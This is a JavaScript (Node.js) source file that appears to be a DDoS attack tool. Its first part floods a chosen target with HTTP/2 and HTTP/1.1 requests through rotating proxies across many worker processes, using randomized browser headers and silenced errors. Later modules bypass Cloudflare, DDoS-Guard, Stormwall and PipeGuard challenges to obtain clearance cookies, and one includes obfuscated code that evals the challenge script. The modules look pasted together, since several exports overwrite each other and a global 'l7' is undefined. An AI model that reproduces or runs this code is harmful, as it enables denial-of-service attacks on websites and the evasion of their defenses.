const url = require('url'),
    fs = require('fs'),
    http2 = require('http2'),
    http = require('http'),
    net = require('net'),
    tls = require('tls'),
    cluster = require('cluster'),
    { HeaderGenerator } = require('header-generator'),
    ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError'],
    ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO'];

process.on('uncaughtException', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);

let headerGenerator = new HeaderGenerator({
    browsers: [
        {name: "chrome", minVersion: 65, httpVersion: "2"},
        {name: "firefox", minVersion: 80, httpVersion: "2"},
        {name: "safari", httpVersion: "2"},
    ],
    devices: [
        "desktop",
        "mobile"
    ],
    operatingSystems: [
        "linux",
        "windows",
        "macos",
        "android",
        "ios"
    ],
    locales: ["en-US", "en"]
});

tls.DEFAULT_ECDH_CURVE;
tls.authorized = true;
tls.sync = true;

let target = process.argv[2],
    time = process.argv[3],
    thread = process.argv[4],
    proxys = fs.readFileSync(process.argv[5], 'utf-8').toString().match(/\S+/g),
    rps = process.argv[6],
    type = process.argv[7];

function proxyr() {
    return proxys[Math.floor(Math.random() * proxys.length)];
}

if (cluster.isMaster) {
    console.log(`Target: ${target} | Threads: ${thread} | RPS: ${rps} | Method: ${type}`);

    for (var bb = 0; bb < thread; bb++) {
        cluster.fork();
    }

    setTimeout(() => {
        process.exit(-1);
    }, time * 1000)

} else {
    function flood() {
        var parsed = url.parse(target);
        var proxy = proxyr().split(':');
        let randomHeaders = headerGenerator.getHeaders();
        var header = randomHeaders;

        if(parsed.protocol == "https:") {
            randomHeaders[":path"] = parsed.path;
            randomHeaders[":method"] = type;
            randomHeaders[":scheme"] = parsed.protocol.replace(":", "");
            randomHeaders[":authority"] = parsed.host;
        }
        const agent = new http.Agent({
            keepAlive: true,
            keepAliveMsecs: 50000,
            maxSockets: Infinity,
            maxTotalSockets: Infinity,
            maxSockets: Infinity
        });
        var req = http.request({
            host: proxy[0],
            agent: agent,
            globalAgent: agent,
            port: proxy[1],
            headers: {
                'Host': parsed.host,
                'Proxy-Connection': 'Keep-Alive',
                'Connection': 'Keep-Alive',
            },
            method: 'CONNECT',
            path: parsed.host
        }, function() {
            req.setSocketKeepAlive(true);
        });
        const sigalgs = [
            'ecdsa_secp256r1_sha256',
            'ecdsa_secp384r1_sha384',
            'ecdsa_secp521r1_sha512',
            'rsa_pss_rsae_sha256',
            'rsa_pss_rsae_sha384',
            'rsa_pss_rsae_sha512',
            'rsa_pkcs1_sha256',
            'rsa_pkcs1_sha384',
            'rsa_pkcs1_sha512',
        ];

        let SignalsList = sigalgs.join(':');
        
        const uri = new URL(target)

        const port = uri.port == '' ? parsed.protocol == "https" ? 443 : 80 : parseInt(uri.port)


        req.on('connect', function(res, socket, head) {

            if(parsed.protocol == "https:") {
                const client = http2.connect(parsed.href, {
                    createConnection: () => tls.connect({
                        host: parsed.host,
                        ciphers: tls.getCiphers().standardName,
                        secureProtocol: ['TLSv1_1_method', 'TLSv1_2_method', 'TLSv1_3_method'],
                        port,
                        servername: parsed.host,
                        maxRedirects: 20,
                        followAllRedirects: true,
                        secure: true,
                        sigalgs: SignalsList,
                        rejectUnauthorized: false,
                        honorCipherOrder: true,
                        ALPNProtocols: ['h2', 'http1.1'],
                        sessionTimeout: 5000,
                        socket: socket
                    }, function() {
                        for (let i = 0; i < rps; i++) {
                            const req = client.request(header);
                            req.setEncoding('utf8');
                            req.on('data', (chunk) => {
                            });
                            req.on("response", () => {
                                req.close();
                            })
                            req.end();
                        }
                    })
                });
            }
            else {
                let requestPayload = `${type} ${parsed.href} HTTP/1.1\r\n`;

                randomHeaders = {}
                randomHeaders["Host"] = parsed.host;
                randomHeaders["Connection"] = "keep-alive";

                for (const header in randomHeaders) 
                {
                    function titleCase(str) 
                    {
                        const splitStr = str.toLowerCase().split('-');

                        for (let i = 0; i < splitStr.length; i++) {
                            splitStr[i] = splitStr[i].charAt(0).toUpperCase() + splitStr[i].substring(1);     
                        }

                        return splitStr.join('-'); 
                    }      
            
                    requestPayload += titleCase(header) + ": " + randomHeaders[header] + "\r\n"
                }
                requestPayload += "\r\n"

                let socket = net.connect(proxy[1], proxy[0]);
                
                socket.setKeepAlive(true, 5000);
                socket.setTimeout(5000);

                socket.once('error', err => { socket.destroy() });
                socket.once('disconnect', () => {});

                socket.once('data', () => setTimeout( () => socket.destroy(), 10000))

                for (let i = 0; i < rps; i++) {
                    socket.write(Buffer.from(requestPayload, "binary"))
                }

                socket.on('data', function() {
                    setTimeout(function() {
                        socket.destroy();
                        return delete socket;
                    }, 5000);
                });
            }
        });
        req.end();  
    }

    setInterval(() => {
        flood()
    })
}

module.exports = function Cloudflare() {
    const privacypass = require('./privacypass'),
        cloudscraper = require('cloudscraper'),
        request = require('request'),
        fs = require('fs');
    var privacyPassSupport = true;
    function useNewToken() {
        privacypass(l7.target);
        console.log('[cloudflare-bypass ~ privacypass]: generated new token');
    }

    if (l7.firewall[1] == 'captcha') {
        privacyPassSupport = l7.firewall[2];
        useNewToken();
    }

    function bypass(proxy, uagent, callback, force) {
        num = Math.random() * Math.pow(Math.random(), Math.floor(Math.random() * 10))
        var cookie = "";
        if (l7.firewall[1] == 'captcha' || force && privacyPassSupport) {
            request.get({
                url: l7.target + "?_asds=" + num,
                gzip: true,
                proxy: proxy,
                headers: {
                    'Connection': 'Keep-Alive',
                    'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': 1,
                    'User-Agent': uagent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-US;q=0.9'
                }
            }, (err, res) => {
                if (!res) {
                    return false;
                }
                if (res.headers['cf-chl-bypass'] && res.headers['set-cookie']) {

                } else {
                    if (l7.firewall[1] == 'captcha') {
                        logger('[cloudflare-bypass]: The target is not supporting privacypass');
                        return false;
                    } else {
                        privacyPassSupport = false;
                    }
                }

                cookie = res.headers['set-cookie'].shift().split(';').shift();
                if (l7.firewall[1] == 'captcha' && privacyPassSupport || force && privacyPassSupport) {
                    cloudscraper.get({
                        url: l7.target + "?_asds=" + num,
                        gzip: true,
                        proxy: proxy,
                        headers: {
                            'Connection': 'Keep-Alive',
                            'Cache-Control': 'max-age=0',
                            'Upgrade-Insecure-Requests': 1,
                            'User-Agent': uagent,
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Accept-Language': 'en-US;q=0.9',
                            'challenge-bypass-token': l7.privacypass,
                            "Cookie": cookie
                        }
                    }, (err, res) => {
                        if (err || !res) return false;
                        if (res.headers['set-cookie']) {
                            cookie += '; ' + res.headers['set-cookie'].shift().split(';').shift();
                            cloudscraper.get({
                                url: l7.target + "?_asds=" + num,
                                proxy: proxy,
                                headers: {
                                    'Connection': 'Keep-Alive',
                                    'Cache-Control': 'max-age=0',
                                    'Upgrade-Insecure-Requests': 1,
                                    'User-Agent': uagent,
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                                    'Accept-Encoding': 'gzip, deflate, br',
                                    'Accept-Language': 'en-US;q=0.9',
                                    "Cookie": cookie
                                }
                            }, (err, res, body) => {
                                if (err || !res || res && res.statusCode == 403) {
                                    console.warn('[cloudflare-bypass ~ privacypass]: Failed to bypass with privacypass, generating new token:');
                                    useNewToken();
                                    return;
                                }
                                callback(cookie);
                            });
                        } else {
                            console.log(res.statusCode, res.headers);
                            if (res.headers['cf-chl-bypass-resp']) {
                                let respHeader = res.headers['cf-chl-bypass-resp'];
                                switch (respHeader) {
                                    case '6':
                                        console.warn("[privacy-pass]: internal server connection error occurred");
                                        break;
                                    case '5':
                                        console.warn(`[privacy-pass]: token verification failed for ${l7.target}`);
                                        useNewToken();
                                        break;
                                    case '7':
                                        console.warn(`[privacy-pass]: server indicated a bad client request`);
                                        break;
                                    case '8':
                                        console.warn(`[privacy-pass]: server sent unrecognised response code (${header.value})`);
                                        break;
                                }
                                return bypass(proxy, uagent, callback, true);
                            }
                        }
                    });
                } else {
                    cloudscraper.get({
                        url: l7.target + "?_asds=" + num,
                        proxy: proxy,
                        headers: {
                            'Connection': 'Keep-Alive',
                            'Cache-Control': 'max-age=0',
                            'Upgrade-Insecure-Requests': 1,
                            'User-Agent': uagent,
                            'Accept-Language': 'en-US;q=0.9'
                        }
                    }, (err, res) => {
                        if (err || !res || !res.request.headers.cookie) {
                            if (err) {
                                if (err.name == 'CaptchaError') {
                                    return bypass(proxy, uagent, callback, true);
                                }
                            }
                            return false;
                        }
                        callback(res.request.headers.cookie);
                    });
                }
            });
        } else if (l7.firewall[1] == 'uam' && privacyPassSupport == false) {
            cloudscraper.get({
                url: l7.target + "?_asds=" + num,
                proxy: proxy,
                headers: {
                    'Upgrade-Insecure-Requests': 1,
                    'User-Agent': uagent
                }
            }, (err, res, body) => {
                if (err) {
                    if (err.name == 'CaptchaError') {
                        return bypass(proxy, uagent, callback, true);
                    }
                    return false;
                }
                if (res && res.request.headers.cookie) {
                    callback(res.request.headers.cookie);
                } else if (res && body && res.headers.server == 'cloudflare') {
                    if (res && body && /Why do I have to complete a CAPTCHA/.test(body) && res.headers.server == 'cloudflare' && res.statusCode !== 200) {
                        return bypass(proxy, uagent, callback, true);
                    }
                } else {

                }
            });
        } else {
            cloudscraper.get({
                url: l7.target + "?_asds=" + num,
                gzip: true,
                proxy: proxy,
                headers: {
                    'Connection': 'Keep-Alive',
                    'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': 1,
                    'User-Agent': uagent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-US;q=0.9'
                }
            }, (err, res, body) => {
                if (err || !res || !body || !res.headers['set-cookie']) {
                    if (res && body && /Why do I have to complete a CAPTCHA/.test(body) && res.headers.server == 'cloudflare' && res.statusCode !== 200) {
                        return bypass(proxy, uagent, callback, true);
                    }
                    return false;
                }
                cookie = res.headers['set-cookie'].shift().split(';').shift();
                callback(cookie);
            });
        }
    }

    return bypass;
}

module.exports = function DDoSGuard() {
    const request = require('request'),
        cloudscraper = require('cloudscraper');

    function encode(string) {
        return Buffer.from(string).toString('base64');
    }

    var hS, uS, pS;
    hS = encode(l7.parsed.protocol + '//' + l7.parsed.host);
    uS = encode(l7.parsed.path);
    pS = encode(l7.parsed.port || '');

    function bypass(proxy, uagent, callback, force, cookie) {
        if (!cookie) {
            cookie = '';
        }
        if (['5sec', 'free'].indexOf(l7.firewall[1]) !== -1 || force) {
            let bypassJar = request.jar();
            request.get({
                url: l7.parsed.protocol + '//ddgu.ddos-guard.net/g',
                gzip: true,
                proxy: proxy,
                jar: bypassJar,
                headers: {
                    'Connection': 'keep-alive',
                    'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': 1,
                    'User-Agent': uagent,
                    'Accept': 'image/webp,image/apng,image/*,*/*;q=0.8',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-US;q=0.9',
                    'Referer': l7.target,
                    'Origin': l7.parsed.protocol + '//' + l7.parsed.host
                }
            }, (err, res, body) => {
                if (err || !res || !body) {
                    return false;
                }

                request.get({
                    url: l7.parsed.protocol + '//ddgu.ddos-guard.net/c',
                    gzip: true,
                    proxy: proxy,
                    jar: bypassJar,
                    headers: {
                        'Connection': 'keep-alive',
                        'User-Agent': uagent,
                        'Accept': '*/*',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Referer': l7.target,
                        Origin: l7.parsed.protocol + '//' + l7.parsed.host,
                        'Accept-Language': 'en-US;q=0.9'
                    }
                }, (err, res, body) => {
                    if (err || !res || !body) {
                        return false;
                    }

                    request.post({
                        url: l7.parsed.protocol + '//ddgu.ddos-guard.net/ddgu/',
                        gzip: true,
                        proxy: proxy,
                        jar: bypassJar,
                        followAllRedirects: true,
                        headers: {
                            'Connection': 'Keep-Alive',
                            'Cache-Control': 'max-age=0',
                            'Upgrade-Insecure-Requests': 1,
                            'User-Agent': uagent,
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                            'Accept-Encoding': 'gzip, deflate, br',
                            "Referer": l7.target,
                            Origin: l7.parsed.protocol + '//' + l7.parsed.host,
                            'Accept-Language': 'en-US;q=0.9'
                        },
                        form: {
                            u: uS,
                            h: hS,
                            p: pS
                        }
                    }, (err, res, body) => {
                        if (err || !res || !body) {
                            return false;
                        }
                        if (body.indexOf('enter the symbols from the picture to the form below. </div>') !== -1) {
                            logger('[ddos-guard] Captcha received, Ip rep died.');
                        } else {
                            callback(res.request.headers.cookie);
                        }
                    });
                });
            });
        } else {
            cloudscraper.get({
                url: l7.target,
                gzip: true,
                proxy: proxy,
                jar: true,
                followAllRedirects: true,
                headers: {
                    'Connection': 'Keep-Alive',
                    'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': 1,
                    'User-Agent': uagent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-US;q=0.9'
                }
            }, (err, res, body) => {
                if (err || !res || !body) {
                    return false;
                }
                if (res.request.headers.cookie) {
                    callback(res.request.headers.cookie);
                } else {
                    if (res.statusCode == 403 && body.indexOf("<title>DDOS-GUARD</title>") !== -1) {
                        return bypass(proxy, uagent, callback, true);
                    } else {
                        return false;
                    }
                }
            });
        }
    }

    return bypass;
}

module.exports = function Stormwall() {
    const request = require('cloudscraper'),
        document = {
            cookie: ''
        };

    global.window = {navigator: {}};

    var BYPASSIT = {};

    var _0xda3f = ['__phantom', 'Buffer', 'emit', 'spawn', 'domAutomation', 'webdriver', 'selenium', './adv', '0123456789qwertyuiopasdfghjklzxcvbnm:?!', 'toString', 'getElementById', 'className', 'error-frame', 'invisible', 'undefined', 'location', 'Cannot\x20find\x20module\x20\x27', 'MODULE_NOT_FOUND', 'exports', 'function', 'length', '_phantom'];
    (function (_0x502b53, _0x2696a0) {
        var _0xe3cb5a = function (_0x4f70f6) {
            while (--_0x4f70f6) {
                _0x502b53['push'](_0x502b53['shift']());
            }
        };
        _0xe3cb5a(++_0x2696a0);
    }(_0xda3f, 0xec));
    var _0xfda3 = function (_0x3854ba, _0x105aa1) {
        _0x3854ba = _0x3854ba - 0x0;
        var _0x36d4c9 = _0xda3f[_0x3854ba];
        return _0x36d4c9;
    };
    (function e(_0x33f0ce, _0x4e1686, _0x58a80c) {
        function _0x23a0c0(_0x4bc934, _0x149a56) {
            if (!_0x4e1686[_0x4bc934]) {
                if (!_0x33f0ce[_0x4bc934]) {
                    var _0x37652d = typeof require == 'function' && require;
                    if (!_0x149a56 && _0x37652d) return _0x37652d(_0x4bc934, !0x0);
                    if (_0x7bb490) return _0x7bb490(_0x4bc934, !0x0);
                    var _0x36dc71 = new Error(_0xfda3('0x0') + _0x4bc934 + '\x27');
                    throw _0x36dc71['code'] = _0xfda3('0x1'), _0x36dc71;
                }
                var _0x43a010 = _0x4e1686[_0x4bc934] = {
                    'exports': {}
                };
                _0x33f0ce[_0x4bc934][0x0]['call'](_0x43a010['exports'], function (_0x316792) {
                    var _0x4e1686 = _0x33f0ce[_0x4bc934][0x1][_0x316792];
                    return _0x23a0c0(_0x4e1686 ? _0x4e1686 : _0x316792);
                }, _0x43a010, _0x43a010[_0xfda3('0x2')], e, _0x33f0ce, _0x4e1686, _0x58a80c);
            }
            return _0x4e1686[_0x4bc934][_0xfda3('0x2')];
        }
        var _0x7bb490 = typeof require == _0xfda3('0x3') && require;
        for (var _0x46655c = 0x0; _0x46655c < _0x58a80c[_0xfda3('0x4')]; _0x46655c++) _0x23a0c0(_0x58a80c[_0x46655c]);
        return _0x23a0c0;
    }({
        1: [function (_0xdc5b45, _0x14d549, _0x102643) {
            let _0x4713ba = {
                'a': window['callPhantom'],
                'b': window[_0xfda3('0x5')],
                'c': window[_0xfda3('0x6')],
                'd': window[_0xfda3('0x7')],
                'e': window[_0xfda3('0x8')],
                'f': window[_0xfda3('0x9')],
                'g': window['webdriver'],
                'h': window[_0xfda3('0xa')],
                'i': window['navigator'][_0xfda3('0xb')],
                'j': window[_0xfda3('0xc')],
                'k': window['navigator']['selenium']
            };

            function _0x587e9b() {
                for (let _0x227d72 in _0x4713ba) {
                    if (_0x4713ba[_0x227d72]) {
                        return !![];
                    }
                }
                return ![];
            }
            _0x14d549[_0xfda3('0x2')] = _0x587e9b;
        }, {}],
        2: [function (_0x5ea793, _0x57a229, _0x533365) {
            let _0x80ea80 = _0x5ea793(_0xfda3('0xd'));
            let _0x249dc6 = _0xfda3('0xe');
            let _0x34900d = [];
            let _0x40d702 = {};

            function _0x2aadcb(_0x93c8ef) {
                for (let _0x4680bf = 0x0; _0x4680bf < _0x93c8ef[_0xfda3('0x4')]; _0x4680bf++) {
                    _0x34900d[_0x4680bf] = _0x93c8ef[_0x4680bf];
                    _0x40d702[_0x93c8ef[_0x4680bf]] = _0x4680bf;
                }
            }

            function _0x54a7c6(_0x15ddb9, _0x1bbdda) {
                let _0x12d568 = _0x34900d[_0xfda3('0x4')] - 0x1;
                let _0x59a887 = '';
                for (let _0x42faad = 0x0; _0x42faad < _0x1bbdda[_0xfda3('0x4')]; _0x42faad++) {
                    let _0x2ee74c = _0x1bbdda[_0x42faad];
                    if (typeof _0x40d702[_0x2ee74c] == 'undefined') {
                        _0x59a887 = _0x59a887 + _0x2ee74c;
                    } else {
                        let _0x5ad52a = _0x40d702[_0x2ee74c] + _0x15ddb9;
                        if (_0x5ad52a > _0x12d568) {
                            _0x5ad52a = _0x5ad52a - _0x12d568 - 0x1;
                        } else if (_0x5ad52a < 0x0) {
                            _0x5ad52a = _0x12d568 + _0x5ad52a + 0x1;
                        }
                        _0x59a887 = _0x59a887 + _0x34900d[_0x5ad52a];
                    }
                }
                return _0x59a887;
            }

            function _0xa0449d(_0x38d428, _0x4ea9f5) {
                let _0x545320 = _0x34900d[_0xfda3('0x4')] - 0x1;
                let _0xef2535 = _0x38d428;
                let _0x1e15a8 = '';
                for (let _0x2c0ae9 = 0x0; _0x2c0ae9 < _0x4ea9f5[_0xfda3('0x4')]; _0x2c0ae9++) {
                    let _0x2b84b7 = '' + _0x4ea9f5[_0x2c0ae9];
                    _0x1e15a8 = _0x1e15a8 + _0x54a7c6(_0xef2535, _0x2b84b7);
                    _0xef2535 = _0xef2535 + 0x1;
                    if (_0xef2535 > _0x545320) {
                        _0xef2535 = 0x0;
                    }
                }
                return _0x1e15a8;
            }

            function _0x2677f6(_0xc6fb9a, _0x16eaa6) {
                let _0x5499f5 = _0x34900d[_0xfda3('0x4')] - 0x1;
                let _0x2d5b44 = _0xc6fb9a;
                let _0x2e8bf8 = '';
                if (_0x80ea80()) {
                    _0x2e8bf8 += Date['new']()[_0xfda3('0xf')]();
                    res += ':';
                }
                for (let _0x39e246 = 0x0; _0x39e246 < _0x16eaa6[_0xfda3('0x4')]; _0x39e246++) {
                    let _0x38946d = '' + _0x16eaa6[_0x39e246];
                    _0x2e8bf8 = _0x2e8bf8 + _0x54a7c6(_0x2d5b44 * -0x1, _0x38946d);
                    _0x2d5b44 = _0x2d5b44 + 0x1;
                    if (_0x2d5b44 > _0x5499f5) {
                        _0x2d5b44 = 0x0;
                    }
                }
                return _0x2e8bf8;
            }

            let _0x474992 = 0x0;
            if (typeof googleAnal != _0xfda3('0x14') || typeof yaMetrika != _0xfda3('0x14')) _0x474992 = 0x3e8;
            _0x2aadcb(_0x249dc6);
            BYPASSIT = function (defines) {
                return eval(defines + '; document.cookie = cN + \'=\' + _0x2677f6(cK, cE)');
            }
        }, {
            './adv': 0x1
        }]
    }, {}, [0x2]));

    function Bypasser(body) {
        return new Promise((resolve, reject) => {
            resolve(BYPASSIT(body.split('<script>')[2].split('</script>')[0])); // Wallah return the bypass cookie;
        });
    }

    return function bypass(proxy, uagent, callback) {
        request({
            method: "GET",
            url: l7.target,
            gzip: true,
            proxy: proxy,
            followAllRedirects: true,
            headers: {
                'Connection': 'keep-alive',
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': 1,
                'User-Agent': uagent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9'
            }
        }, (err, res, body) => {
            if (err || !res || !body || body.indexOf('const cN = ') == -1) {
                if (body && body.indexOf('Your browser cannot be verified automatically, please confirm you are not a robot.') !== -1) {
                    return logger('[stormwall] Captcha received, IP reputation died.');
                }
                return false;
            }
            Bypasser(body).then(cookie => {
                request({
                    method: "GET",
                    url: l7.target,
                    gzip: true,
                    proxy: proxy,
                    followAllRedirects: true,
                    headers: {
                        'Connection': 'keep-alive',
                        'Cache-Control': 'max-age=0',
                        'Upgrade-Insecure-Requests': 1,
                        'User-Agent': uagent,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'en-US,en;q=0.5',
                        "Cookie": cookie
                    }
                }, (err, res, body) => {
                    if (err || !res) {
                        return false;
                    }
                    //console.log(cookie, body);
                    callback(cookie);
                })
            });
        });
    }
}

module.exports = function PipeGuard() {
    const request = require('request');

    function Bypasser(body, callback) {
        callback(body.match(/PipeGuard=([^\\s;]*)/)[0]);
    }

    return function bypass(proxy, uagent, callback) {
        request({
            url: l7.target,
            method: "GET",
            gzip: true,
            followAllRedirects: true,
            jar: true,
            proxy: proxy,
            headers: {
                'Connection': 'keep-alive',
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': 1,
                'User-Agent': uagent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9'
            }
        }, (err, res, body) => {
            if (err || !res || !body || body.indexOf('document.cookie = "PipeGuard=') == -1) {
                return false;
            }
            Bypasser(body, cookies => {
                request({
                    url: l7.target,
                    method: "GET",
                    gzip: true,
                    proxy: proxy,
                    followAllRedirects: true,
                    jar: true,
                    headers: {
                        'Connection': 'keep-alive',
                        'Cache-Control': 'max-age=0',
                        'Upgrade-Insecure-Requests': 1,
                        'User-Agent': uagent,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Cookie': cookies
                    }
                }, (err, res, body) => {
                    if (res && res.request.headers.Cookie) {
                        //console.log(res.request.headers.Cookie);
                        callback(res.request.headers.Cookie);
                    }
                    /*if (err || !res || !body) {
                        return false;
                    }*/
                });
            })
        });
    }
}

